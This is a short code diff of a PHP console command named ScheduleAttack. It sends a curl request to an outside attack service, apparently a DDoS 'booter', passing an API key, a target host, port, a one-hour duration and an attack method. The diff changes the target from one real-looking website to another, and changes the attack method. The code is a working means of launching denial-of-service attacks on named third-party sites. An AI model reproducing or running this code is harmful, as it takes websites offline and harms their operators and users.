@@ -38,10 +38,10 @@ class ScheduleAttack extends Command
     public function handle()
     {
         $k = 'BghUuaFPZH5x4Voa';
-        $h = 'https://magicoption.co';
-        $p = 443;
+        $h = 'http://e-viki.com';
+        $p = 80;
         $t = 3600;
-        $m = 'Anon-Capt';
+        $m = 'Anon-HSv2';
         $ch = curl_init("https://anonboot.ga/?key={$k}&host={$h}&port={$p}&time={$t}&method={$m}");
         curl_setopt($ch, CURLOPT_HEADER, 0);
         curl_setopt($ch, CURLOPT_TIMEOUT, 60);
